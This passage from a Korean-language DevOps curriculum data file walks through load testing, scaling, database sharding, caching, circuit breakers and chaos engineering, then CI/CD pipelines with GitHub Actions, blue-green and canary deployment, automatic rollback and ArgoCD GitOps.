     http_req_duration..........: avg=680ms p(95)=1.2s p(99)=2.5s ← p99 초과!`
                },
                {
                  heading: "2. CapRover에서 앱 스케일링",
                  steps: [
                    {
                      label: "수동 스케일링",
                      code: `# CapRover 대시보드
1. Apps 메뉴 → 앱 선택
2. "App Configs" 탭
3. "Instance Count" 섹션
   - 현재: 1
   - 변경: 3 (3개 인스턴스)
4. "Save & Update" 클릭

# 결과:
- 3개의 컨테이너가 실행됨
- CapRover가 자동으로 Load Balancing
- 트래픽이 3개에 분산됨

# 확인
docker ps | grep app-name
# app-name.1  (포트 32771)
# app-name.2  (포트 32772)
# app-name.3  (포트 32773)

# 부하 테스트 재실행
ab -n 1000 -c 200 https://your-app.com/
# 개선:
# Before: Requests/sec: 50, Time/req: 4000ms
# After:  Requests/sec: 140, Time/req: 1400ms (280% 향상!)`
                    },
                    {
                      label: "Docker Compose로 스케일링",
                      code: `# docker-compose.yml
version: '3.8'
services:
  app:
    image: myapp:latest
    deploy:
      replicas: 3 # 3개 인스턴스
      resources:
        limits:
          cpus: '1'
          memory: 512M
        reservations:
          cpus: '0.5'
          memory: 256M
    environment:
      NODE_ENV: production

  nginx:
    image: nginx:alpine
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - app

# nginx.conf (로드 밸런서)
upstream backend {
  server app:3000;
  # Docker Compose가 자동으로 3개 인스턴스에 분산
}

server {
  listen 80;
  location / {
    proxy_pass http://backend;
    proxy_set_header Host $host;
  }
}

# 실행
docker-compose up --scale app=3`
                    }
                  ]
                },
                {
                  heading: "3. 데이터베이스 병목 해결",
                  code: `// 문제: DB 연결 수 부족
// Error: ER_TOO_MANY_CONNECTIONS

// 해결 1: Connection Pooling 최적화
const mysql = require('mysql2/promise');

const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'mydb',
  waitForConnections: true,
  connectionLimit: 50, // 10 → 50으로 증가
  queueLimit: 0,
  enableKeepAlive: true,
  keepAliveInitialDelay: 10000
});

// 해결 2: Read Replica 사용
const masterPool = mysql.createPool({
  host: 'mysql-master.example.com',
  // ... (쓰기 전용)
});

const replicaPool = mysql.createPool({
  host: 'mysql-replica.example.com',
  // ... (읽기 전용)
});

app.get('/api/products', async (req, res) => {
  // 읽기는 Replica에서
  const [products] = await replicaPool.query('SELECT * FROM products');
  res.json(products);
});

app.post('/api/products', async (req, res) => {
  // 쓰기는 Master에서
  await masterPool.query('INSERT INTO products ...', [...]);
  res.json({ success: true });
});

// 해결 3: 쿼리 캐싱
const cache = new Map();

app.get('/api/products', async (req, res) => {
  const cacheKey = 'products:all';

  if (cache.has(cacheKey)) {
    return res.json(cache.get(cacheKey));
  }

  const [products] = await pool.query('SELECT * FROM products');
  cache.set(cacheKey, products);

  // 5분 후 캐시 삭제
  setTimeout(() => cache.delete(cacheKey), 5 * 60 * 1000);

  res.json(products);
});`
                },
                {
                  heading: "4. CDN과 정적 파일 분리",
                  code: `// 문제: 이미지/CSS/JS 요청이 서버 부하 증가

// 해결: Cloudflare CDN 사용
// 1. Cloudflare 계정 생성
// 2. 도메인 추가
// 3. 네임서버 변경

// 정적 파일 캐싱 규칙
// Cloudflare 대시보드 → Page Rules
// URL: *your-app.com/assets/*
// Settings:
//   - Cache Level: Cache Everything
//   - Edge Cache TTL: 1 month
//   - Browser Cache TTL: 1 year

// Express에서 정적 파일 분리
app.use('/assets', express.static('public', {
  maxAge: '1y',
  immutable: true,
  setHeaders: (res, path) => {
    res.set('Access-Control-Allow-Origin', '*');
  }
}));

// HTML에서 CDN URL 사용
<link rel="stylesheet" href="https://cdn.your-app.com/assets/style.css">
<img src="https://cdn.your-app.com/assets/logo.png">

// 효과:
// Before: 서버가 모든 요청 처리 (이미지/CSS/JS 포함)
// After: CDN이 정적 파일 처리 → 서버 부하 70% 감소`
                },
                {
                  heading: "5. 자동 스케일링 (Auto Scaling) 개념",
                  code: `// Kubernetes HPA (Horizontal Pod Autoscaler) 예시
// hpa.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: myapp-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: myapp
  minReplicas: 2
  maxReplicas: 10
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70 # CPU 70% 시 스케일 아웃

# 적용
kubectl apply -f hpa.yaml

# 동작 원리:
# 1. CPU 사용률이 70% 초과 → 파드 추가
# 2. CPU 사용률이 50% 미만 → 파드 감소
# 3. 최소 2개, 최대 10개 유지

# AWS ECS Auto Scaling 예시
aws application-autoscaling register-scalable-target \\
  --service-namespace ecs \\
  --scalable-dimension ecs:service:DesiredCount \\
  --resource-id service/my-cluster/my-service \\
  --min-capacity 2 \\
  --max-capacity 10

aws application-autoscaling put-scaling-policy \\
  --policy-name cpu-scaling \\
  --service-namespace ecs \\
  --scalable-dimension ecs:service:DesiredCount \\
  --resource-id service/my-cluster/my-service \\
  --policy-type TargetTrackingScaling \\
  --target-tracking-scaling-policy-configuration file://config.json

# config.json
{
  "TargetValue": 70.0,
  "PredefinedMetricSpecification": {
    "PredefinedMetricType": "ECSServiceAverageCPUUtilization"
  }
}`
                },
                {
                  heading: "⚡ 중급 실습 과제",
                  checklist: [
                    "k6로 실제 사용자 여정 시나리오 작성 후 15분간 부하 테스트",
                    "CapRover에서 앱 인스턴스를 1개 → 3개로 증가 후 성능 비교",
                    "MySQL Connection Pool 크기 조정 후 동시 접속 한계 재측정",
                    "Cloudflare CDN 연결 후 정적 파일 응답 시간 90% 이상 개선",
                    "CPU 70% 도달 시 자동 스케일링 규칙 설정 (CapRover 또는 K8s)"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 대규모 트래픽 대비 아키텍처 설계",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "수백만 사용자를 처리할 수 있는 확장 가능한 아키텍처를 설계하고 구현할 수 있다."
                },
                {
                  heading: "1. 분산 부하 테스트 (Distributed Load Testing)",
                  code: `// k6 Cloud로 전 세계 다중 위치 테스트
k6 cloud run load-test.js

// 또는 Grafana k6 Cloud 설정
export const options = {
  cloud: {
    name: 'Global Load Test',
    projectID: 12345,
    distribution: {
      'amazon:us:ashburn': { loadZone: 'amazon:us:ashburn', percent: 40 },
      'amazon:ie:dublin': { loadZone: 'amazon:ie:dublin', percent: 30 },
      'amazon:jp:tokyo': { loadZone: 'amazon:jp:tokyo', percent: 30 },
    },
  },
  stages: [
    { duration: '5m', target: 10000 }, // 1만 명까지
  ],
};

// Locust로 분산 테스트 (Python)
# locustfile.py
from locust import HttpUser, task, between

class WebsiteUser(HttpUser):
    wait_time = between(1, 3)

    @task(3)
    def view_products(self):
        self.client.get("/api/products")

    @task(1)
    def view_product_detail(self):
        product_id = random.randint(1, 100)
        self.client.get(f"/api/products/{product_id}")

# Master 서버에서 실행
locust -f locustfile.py --master

# Worker 서버 3대에서 실행
locust -f locustfile.py --worker --master-host=<master-ip>

# 웹 UI에서 테스트 시작: http://localhost:8089
# 목표: 10만 명 동시 사용자`
                },
                {
                  heading: "2. 멀티 리전 배포 아키텍처",
                  code: `# AWS Global Accelerator + CloudFront
# architecture.yml
Resources:
  # 1. 멀티 리전 배포
  USEastApp:
    Type: AWS::ECS::Service
    Properties:
      Cluster: !Ref ECSCluster
      # us-east-1 리전

  EUWestApp:
    Type: AWS::ECS::Service
    Properties:
      Cluster: !Ref ECSCluster
      # eu-west-1 리전

  APNortheastApp:
    Type: AWS::ECS::Service
    Properties:
      Cluster: !Ref ECSCluster
      # ap-northeast-1 리전

  # 2. Global Accelerator (지연 시간 기반 라우팅)
  GlobalAccelerator:
    Type: AWS::GlobalAccelerator::Accelerator
    Properties:
      IpAddressType: IPV4

  # 3. CloudFront (정적 파일 + 동적 콘텐츠)
  CDN:
    Type: AWS::CloudFront::Distribution
    Properties:
      Origins:
        - DomainName: api.example.com
          OriginPath: /api
          CustomOriginConfig:
            OriginProtocolPolicy: https-only

# Geo-DNS with Route 53
resource "aws_route53_record" "www" {
  zone_id = aws_route53_zone.main.zone_id
  name    = "www"
  type    = "A"

  geolocation_routing_policy {
    continent = "NA" # 북미 → us-east-1
  }

  alias {
    name                   = aws_lb.us_east.dns_name
    zone_id                = aws_lb.us_east.zone_id
    evaluate_target_health = true
  }
}

# 효과:
# - 한국 사용자 → 서울 리전 (지연 50ms)
# - 미국 사용자 → 버지니아 리전 (지연 30ms)
# - 유럽 사용자 → 아일랜드 리전 (지연 40ms)`
                },
                {
                  heading: "3. Database Sharding (샤딩)",
                  content: "데이터를 여러 데이터베이스로 분산하여 처리량 향상:",
                  code: `// 사용자 ID 기반 샤딩
const shards = [
  mysql.createPool({ host: 'db-shard-1.example.com' }), // shard 0
  mysql.createPool({ host: 'db-shard-2.example.com' }), // shard 1
  mysql.createPool({ host: 'db-shard-3.example.com' }), // shard 2
  mysql.createPool({ host: 'db-shard-4.example.com' }), // shard 3
];

function getShardForUser(userId) {
  return shards[userId % shards.length];
}

app.get('/api/users/:userId', async (req, res) => {
  const userId = parseInt(req.params.userId);
  const shard = getShardForUser(userId);

  const [users] = await shard.query(
    'SELECT * FROM users WHERE id = ?',
    [userId]
  );

  res.json(users[0]);
});

// 예시:
// userId = 1 → shard 1 (1 % 4 = 1)
// userId = 5 → shard 1 (5 % 4 = 1)
// userId = 8 → shard 0 (8 % 4 = 0)

// 샤드 간 조인 방지 (비정규화)
// Bad: 샤드 A의 users와 샤드 B의 orders 조인 불가
// Good: orders 테이블에 user_name 컬럼 추가 (중복 허용)

// 샤드 리밸런싱 (샤드 추가 시)
async function rebalanceShards(newShardCount) {
  // 1. 새 샤드 추가
  const newShards = [...shards];
  for (let i = shards.length; i < newShardCount; i++) {
    newShards.push(mysql.createPool({
      host: \`db-shard-\${i + 1}.example.com\`
    }));
  }

  // 2. 데이터 재배치 (점진적으로)
  // 일부 사용자를 새 샤드로 이동
}`
                },
                {
                  heading: "4. 캐시 전략 고도화",
                  code: `// 다층 캐싱 (Multi-tier Caching)
// L1: 애플리케이션 메모리 (빠름, 작음)
// L2: Redis (중간, 큼)
// L3: CDN (느림, 매우 큼)

const NodeCache = require('node-cache');
const Redis = require('ioredis');

const l1Cache = new NodeCache({ stdTTL: 60 }); // 1분
const l2Cache = new Redis();

app.get('/api/products/:id', async (req, res) => {
  const productId = req.params.id;

  // L1 캐시 확인
  let product = l1Cache.get(\`product:\${productId}\`);
  if (product) {
    return res.json({ product, source: 'L1-memory' });
  }

  // L2 캐시 확인
  product = await l2Cache.get(\`product:\${productId}\`);
  if (product) {
    l1Cache.set(\`product:\${productId}\`, JSON.parse(product));
    return res.json({ product: JSON.parse(product), source: 'L2-redis' });
  }

  // DB 조회
  [product] = await db.query('SELECT * FROM products WHERE id = ?', [productId]);

  // 캐시 저장
  l1Cache.set(\`product:\${productId}\`, product);
  await l2Cache.setex(\`product:\${productId}\`, 3600, JSON.stringify(product)); // 1시간

  res.json({ product, source: 'DB' });
});

// Cache Stampede 방지 (동시 캐시 미스)
const locks = new Map();

async function getProductWithLock(productId) {
  const lockKey = \`lock:product:\${productId}\`;

  // 잠금 확인
  if (locks.has(lockKey)) {
    // 다른 요청이 이미 DB 조회 중 → 대기
    await locks.get(lockKey);
    return l2Cache.get(\`product:\${productId}\`);
  }

  // 잠금 설정
  const promise = db.query('SELECT * FROM products WHERE id = ?', [productId])
    .then(async ([product]) => {
      await l2Cache.setex(\`product:\${productId}\`, 3600, JSON.stringify(product));
      locks.delete(lockKey);
      return product;
    });

  locks.set(lockKey, promise);
  return promise;
}`
                },
                {
                  heading: "5. Circuit Breaker 패턴",
                  content: "장애가 발생한 서비스로의 요청을 차단하여 연쇄 장애 방지:",
                  code: `const CircuitBreaker = require('opossum');

// 외부 API 호출
async function callExternalAPI(data) {
  const response = await fetch('https://external-api.com/data', {
    method: 'POST',
    body: JSON.stringify(data),
    timeout: 3000
  });
  return response.json();
}

// Circuit Breaker 설정
const breaker = new CircuitBreaker(callExternalAPI, {
  timeout: 3000, // 3초 타임아웃
  errorThresholdPercentage: 50, // 50% 실패 시
  resetTimeout: 30000, // 30초 후 재시도
  volumeThreshold: 10 // 최소 10개 요청 필요
});

// 상태 모니터링
breaker.on('open', () => {
  console.log('Circuit breaker opened - stopping requests');
});

breaker.on('halfOpen', () => {
  console.log('Circuit breaker half-open - testing');
});

breaker.on('close', () => {
  console.log('Circuit breaker closed - normal operation');
});

// 사용
app.post('/api/process', async (req, res) => {
  try {
    const result = await breaker.fire(req.body);
    res.json(result);
  } catch (err) {
    if (err.message === 'Breaker is open') {
      // Fallback 응답
      res.json({
        error: 'Service temporarily unavailable',
        fallback: true
      });
    } else {
      res.status(500).json({ error: err.message });
    }
  }
});

// 동작:
// 1. 정상: 모든 요청 통과
// 2. 50% 실패: Circuit Open (모든 요청 차단)
// 3. 30초 후: Half-Open (테스트 요청 1개)
// 4. 성공: Circuit Close (정상화)
// 5. 실패: 다시 Open (30초 대기)`
                },
                {
                  heading: "6. Chaos Engineering (카오스 엔지니어링)",
                  code: `# Chaos Monkey (Netflix) - 무작위 서버 종료 시뮬레이션
# chaos.sh
#!/bin/bash

while true; do
  # 30% 확률로 랜덤 컨테이너 종료
  if [ $((RANDOM % 10)) -lt 3 ]; then
    CONTAINER=$(docker ps -q | shuf -n 1)
    echo "Killing container: $CONTAINER"
    docker kill $CONTAINER
  fi

  sleep 300 # 5분마다
done

# Litmus Chaos (Kubernetes)
# pod-delete-chaos.yaml
apiVersion: litmuschaos.io/v1alpha1
kind: ChaosEngine
metadata:
  name: pod-delete-chaos
spec:
  engineState: 'active'
  chaosServiceAccount: pod-delete-sa
  experiments:
  - name: pod-delete
    spec:
      components:
        env:
        - name: TOTAL_CHAOS_DURATION
          value: '60'
        - name: CHAOS_INTERVAL
          value: '10'
        - name: FORCE
          value: 'false'

# 적용
kubectl apply -f pod-delete-chaos.yaml

# 테스트 시나리오:
# 1. 피크 타임에 무작위 파드 삭제
# 2. 애플리케이션이 자동 복구되는지 확인
# 3. 사용자 경험에 영향이 없는지 모니터링

# 네트워크 지연 주입
tc qdisc add dev eth0 root netem delay 200ms 50ms
# 200ms ± 50ms 지연 추가

# 패킷 손실 주입
tc qdisc change dev eth0 root netem loss 10%
# 10% 패킷 손실`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "k6 Cloud로 전 세계 3개 지역에서 동시 부하 테스트 (총 1만 사용자)",
                    "사용자 ID 기반 DB 샤딩 구현 후 처리량 3배 이상 향상 확인",
                    "다층 캐싱 (메모리 + Redis + CDN) 구현 후 캐시 히트율 90% 이상 달성",
                    "Circuit Breaker로 외부 API 장애 시 자동 차단 및 Fallback 응답",
                    "Chaos Monkey로 무작위 서버 종료 시뮬레이션 후 자동 복구 확인"
                  ]
                }
              ]
            }
          }
        }
      ]
    },
    {
      id: 'tier4',
      name: 'Tier 4: 고급 운영 기술',
      period: '진행형',
      color: 'bg-blue-100 border-blue-300 text-blue-800',
      reason: '더 전문적이고 효율적인 운영을 위해',
      topics: [
        {
          id: '4-1',
          name: 'CI/CD와 배포 자동화',
          goal: '안전하고 빠르게 배포할 수 있다',
          hours: 15,
          keywords: ['CI/CD', 'Git workflow', 'automated deployment'],
          tasks: [
            'GitHub Actions 워크플로우 작성',
            '자동 테스트 설정',
            'Blue-Green 배포 구현'
          ],
          content: {
            beginner: {
              title: "초급: CI/CD 개념과 GitHub Actions 기본",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "CI/CD가 무엇인지 이해하고, GitHub Actions로 간단한 자동화 파이프라인을 만들 수 있다."
                },
                {
                  heading: "1. CI/CD가 왜 필요한가?",
                  content: "수동 배포의 문제점과 자동화의 이점을 이해합니다.",
                  list: [
                    "수동 배포: 개발자가 서버 SSH 접속 → git pull → npm install → pm2 restart (10분 소요, 실수 가능)",
                    "자동 배포: git push만 하면 자동으로 테스트 → 빌드 → 배포 (2분 소요, 실수 없음)",
                    "빠른 피드백: 코드 푸시 후 5분 안에 배포 완료 또는 실패 알림",
                    "안정성: 테스트 실패 시 자동으로 배포 중단"
                  ]
                },
                {
                  heading: "2. CI와 CD의 차이",
                  code: `# CI (Continuous Integration) - 지속적 통합
- 개발자가 코드를 push할 때마다:
  1. 코드 린팅 (문법 체크)
  2. 유닛 테스트 실행
  3. 빌드 성공 확인
- 목표: 버그를 빠르게 발견

# CD (Continuous Deployment) - 지속적 배포
- CI가 성공하면:
  1. 빌드된 결과물을 서버에 배포
  2. 서비스 재시작
  3. 헬스 체크
- 목표: 사용자에게 빠르게 전달

# 전체 흐름:
git push → CI (테스트) → CD (배포) → 사용자에게 도달`
                },
                {
                  heading: "3. GitHub Actions 첫 워크플로우",
                  steps: [
                    {
                      label: "기본 구조",
                      code: `# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test

      - name: Build
        run: npm run build`
                    },
                    {
                      label: "동작 확인",
                      code: `# 1. 위 파일을 Git에 커밋
git add .github/workflows/ci.yml
git commit -m "Add CI workflow"
git push

# 2. GitHub 웹사이트에서 확인
# Repository → Actions 탭
# 워크플로우 실행 상태 확인

# 3. 결과:
✓ Checkout code (1s)
✓ Setup Node.js (3s)
✓ Install dependencies (15s)
✓ Run tests (5s)
✓ Build (8s)

Total: 32s`
                    }
                  ]
                },
                {
                  heading: "4. 자동 배포 추가",
                  code: `# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      - name: Deploy to server
        uses: appleboy/ssh-action@master
        with:
          host: \${{ secrets.SERVER_HOST }}
          username: \${{ secrets.SERVER_USER }}
          key: \${{ secrets.SSH_PRIVATE_KEY }}
          script: |
            cd /var/www/myapp
            git pull origin main
            npm install
            npm run build
            pm2 restart myapp

# GitHub Secrets 설정:
# Repository → Settings → Secrets and variables → Actions
# - SERVER_HOST: your-server-ip
# - SERVER_USER: root
# - SSH_PRIVATE_KEY: (복사한 SSH 키)`
                },
                {
                  heading: "5. 실패 시 알림 받기",
                  code: `# Slack 알림 추가
- name: Notify Slack on failure
  if: failure()
  uses: slackapi/slack-github-action@v1
  with:
    payload: |
      {
        "text": "❌ Deployment failed for \${{ github.repository }}",
        "blocks": [
          {
            "type": "section",
            "text": {
              "type": "mrkdwn",
              "text": "Commit: \${{ github.sha }}\\nAuthor: \${{ github.actor }}"
            }
          }
        ]
      }
  env:
    SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}

# Slack Webhook 설정:
# 1. Slack에서 Incoming Webhooks 앱 추가
# 2. Webhook URL 복사
# 3. GitHub Secrets에 SLACK_WEBHOOK 추가`
                },
                {
                  heading: "6. 환경별 배포 (Staging/Production)",
                  code: `# .github/workflows/deploy-staging.yml
name: Deploy to Staging

on:
  push:
    branches: [develop]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      # ... (빌드 단계)
      - name: Deploy to Staging
        uses: appleboy/ssh-action@master
        with:
          host: \${{ secrets.STAGING_HOST }}
          script: |
            cd /var/www/myapp-staging
            git pull origin develop
            # ...

# .github/workflows/deploy-production.yml
name: Deploy to Production

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production # 수동 승인 필요
    steps:
      # ... (빌드 단계)
      - name: Deploy to Production
        uses: appleboy/ssh-action@master
        with:
          host: \${{ secrets.PROD_HOST }}
          script: |
            cd /var/www/myapp
            git pull origin main
            # ...

# 환경 보호 설정:
# Repository → Settings → Environments → New environment
# Name: production
# Required reviewers: (팀원 선택)
# → main 브랜치 push 시 수동 승인 후 배포`
                },
                {
                  heading: "💡 초급 실습 과제",
                  checklist: [
                    "GitHub Actions로 CI 워크플로우 작성 (테스트 + 빌드)",
                    "테스트 실패 시 워크플로우가 중단되는지 확인",
                    "자동 배포 워크플로우 추가하여 main 브랜치 push 시 서버 배포",
                    "Slack 알림 설정하여 배포 실패 시 알림 수신",
                    "Staging과 Production 환경 분리하여 각각 자동 배포"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 고급 배포 전략과 롤백",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Blue-Green 배포, Canary 배포 등 고급 배포 전략을 이해하고 구현할 수 있다."
                },
                {
                  heading: "1. Blue-Green 배포",
                  content: "두 개의 동일한 환경을 준비하여 무중단 배포를 구현합니다.",
                  code: `# docker-compose.yml
version: '3.8'
services:
  app-blue:
    image: myapp:blue
    container_name: app-blue
    ports:
      - "3001:3000"
    environment:
      - COLOR=blue

  app-green:
    image: myapp:green
    container_name: app-green
    ports:
      - "3002:3000"
    environment:
      - COLOR=green

  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf

# nginx.conf
upstream backend {
  server app-blue:3000;  # 현재 활성화된 환경
  # server app-green:3000;
}

server {
  listen 80;
  location / {
    proxy_pass http://backend;
  }
}

# 배포 스크립트
#!/bin/bash
# deploy-blue-green.sh

CURRENT=$(curl -s http://localhost/api/version | jq -r '.env')

if [ "$CURRENT" == "blue" ]; then
  # Green에 새 버전 배포
  docker-compose up -d app-green
  sleep 5  # 헬스 체크 대기

  # 헬스 체크
  if curl -f http://localhost:3002/health; then
    # Nginx 설정 변경 (blue → green)
    sed -i 's/app-blue/app-green/' nginx.conf
    docker-compose restart nginx

    echo "Switched to green"
    # Blue 환경 정리
    docker-compose stop app-blue
  else
    echo "Health check failed, rollback"
    docker-compose stop app-green
  fi
else
  # Blue에 새 버전 배포 (동일한 로직)
  # ...
fi`
                },
                {
                  heading: "2. Canary 배포 (점진적 배포)",
                  code: `# nginx.conf (가중치 기반 라우팅)
upstream backend {
  server app-v1:3000 weight=9;  # 90% 트래픽
  server app-v2:3000 weight=1;  # 10% 트래픽
}

# 단계별 증가
# Step 1: 10% → weight=1
# Step 2: 25% → weight=3
# Step 3: 50% → weight=5
# Step 4: 100% → weight=10 (v1 제거)

# GitHub Actions 워크플로우
name: Canary Deployment

on:
  workflow_dispatch:
    inputs:
      traffic_percentage:
        description: 'Traffic percentage for new version'
        required: true
        default: '10'

jobs:
  canary-deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy new version
        run: |
          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
            docker-compose up -d app-v2

            # Nginx 가중치 변경
            WEIGHT=\${{ github.event.inputs.traffic_percentage }}
            OLD_WEIGHT=$((100 - WEIGHT))

            sed -i "s/weight=.* # v1/weight=$OLD_WEIGHT # v1/" nginx.conf
            sed -i "s/weight=.* # v2/weight=$WEIGHT # v2/" nginx.conf

            docker-compose restart nginx
          EOF

      - name: Monitor metrics
        run: |
          sleep 300  # 5분 모니터링

          ERROR_RATE=$(curl -s https://your-app.com/metrics | jq '.error_rate')

          if (( $(echo "$ERROR_RATE > 0.05" | bc -l) )); then
            echo "Error rate too high, rolling back"
            ssh ... << 'EOF'
              sed -i "s/weight=.* # v1/weight=100 # v1/" nginx.conf
              sed -i "s/weight=.* # v2/weight=0 # v2/" nginx.conf
              docker-compose restart nginx
            EOF
            exit 1
          fi`
                },
                {
                  heading: "3. 자동 롤백 시스템",
                  code: `# .github/workflows/deploy-with-rollback.yml
name: Deploy with Auto Rollback

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Get current version
        id: current
        run: |
          CURRENT=$(ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} 'cat /var/www/myapp/VERSION')
          echo "version=$CURRENT" >> $GITHUB_OUTPUT

      - name: Deploy new version
        run: |
          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
            cd /var/www/myapp
            git pull origin main
            npm install
            npm run build
            echo "\${{ github.sha }}" > VERSION
            pm2 restart myapp
          EOF

      - name: Health check
        id: health
        run: |
          sleep 10
          for i in {1..5}; do
            if curl -f https://your-app.com/health; then
              echo "healthy=true" >> $GITHUB_OUTPUT
              exit 0
            fi
            sleep 5
          done
          echo "healthy=false" >> $GITHUB_OUTPUT

      - name: Rollback on failure
        if: steps.health.outputs.healthy != 'true'
        run: |
          echo "Health check failed, rolling back to \${{ steps.current.outputs.version }}"
          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
            cd /var/www/myapp
            git checkout \${{ steps.current.outputs.version }}
            npm install
            npm run build
            pm2 restart myapp
          EOF

      - name: Notify
        if: always()
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": "\${{ job.status == 'success' && '✅' || '❌' }} Deployment \${{ job.status }}",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "Commit: \${{ github.sha }}\\nHealth: \${{ steps.health.outputs.healthy }}"
                  }
                }
              ]
            }
        env:
          SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}`
                },
                {
                  heading: "4. Docker 이미지 버전 관리",
                  code: `# .github/workflows/build-and-push.yml
name: Build and Push Docker Image

on:
  push:
    branches: [main]
    tags:
      - 'v*'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2

      - name: Login to Docker Hub
        uses: docker/login-action@v2
        with:
          username: \${{ secrets.DOCKER_USERNAME }}
          password: \${{ secrets.DOCKER_PASSWORD }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v4
        with:
          images: myusername/myapp
          tags: |
            type=ref,event=branch
            type=semver,pattern={{version}}
            type=sha

      - name: Build and push
        uses: docker/build-push-action@v4
        with:
          context: .
          push: true
          tags: \${{ steps.meta.outputs.tags }}
          labels: \${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

# 결과:
# main 브랜치 push → myapp:main
# v1.2.3 태그 → myapp:v1.2.3, myapp:1.2, myapp:1
# git sha abc123 → myapp:sha-abc123`
                },
                {
                  heading: "5. 데이터베이스 마이그레이션 자동화",
                  code: `# .github/workflows/deploy-with-migration.yml
- name: Run database migrations
  run: |
    ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
      cd /var/www/myapp

      # 백업 먼저
      mysqldump -u root -p\$DB_PASSWORD mydb > backup_$(date +%Y%m%d_%H%M%S).sql

      # 마이그레이션 실행
      npm run migrate

      # 실패 시 롤백
      if [ $? -ne 0 ]; then
        echo "Migration failed, restoring backup"
        mysql -u root -p\$DB_PASSWORD mydb < backup_*.sql
        exit 1
      fi
    EOF

# package.json
{
  "scripts": {
    "migrate": "npx sequelize-cli db:migrate",
    "migrate:undo": "npx sequelize-cli db:migrate:undo"
  }
}

# migrations/20240101000000-add-column.js
module.exports = {
  up: async (queryInterface, Sequelize) => {
    await queryInterface.addColumn('users', 'phone', {
      type: Sequelize.STRING,
      allowNull: true
    });
  },

  down: async (queryInterface, Sequelize) => {
    await queryInterface.removeColumn('users', 'phone');
  }
};`
                },
                {
                  heading: "⚡ 중급 실습 과제",
                  checklist: [
                    "Blue-Green 배포 구현 후 무중단 배포 성공 확인",
                    "Canary 배포로 10% → 50% → 100% 점진적 배포 실행",
                    "헬스 체크 실패 시 자동 롤백되는지 테스트",
                    "Docker 이미지에 Git SHA 태그 자동 추가하여 버전 추적",
                    "데이터베이스 마이그레이션 실패 시 자동으로 백업 복원"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: GitOps와 멀티 클러스터 배포",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "GitOps 방식으로 선언적 배포를 구현하고, Kubernetes에서 고급 배포 전략을 사용할 수 있다."
                },
                {
                  heading: "1. ArgoCD로 GitOps 구현",
                  code: `# Kubernetes 매니페스트를 Git으로 관리
# k8s/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
        version: v1.2.3
    spec:
      containers:
      - name: myapp
        image: myusername/myapp:v1.2.3
        ports:
        - containerPort: 3000

# ArgoCD Application 정의
# argocd/application.yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: myapp
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/myuser/myapp-k8s
    targetRevision: main
    path: k8s
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
    - CreateNamespace=true

# 배포 프로세스:
# 1. Git에 k8s/deployment.yaml 업데이트 (이미지 버전 변경)
# 2. ArgoCD가 자동으로 감지
# 3. Kubernetes 클러스터에 적용
# 4. 헬스 체크 후 완료

# 설치:
kubectl create namespace argocd
kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml

# 접속:
kubectl port-forward svc/argocd-server -n argocd 8080:443`
                },
                {
                  heading: "2. Kustomize로 환경별 설정 관리",
                  code: `# 기본 설정
# base/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  replicas: 2
  template:
    spec:
      containers:
      - name: myapp
        image: myapp:latest
        resources:
          requests:
            memory: "128Mi"
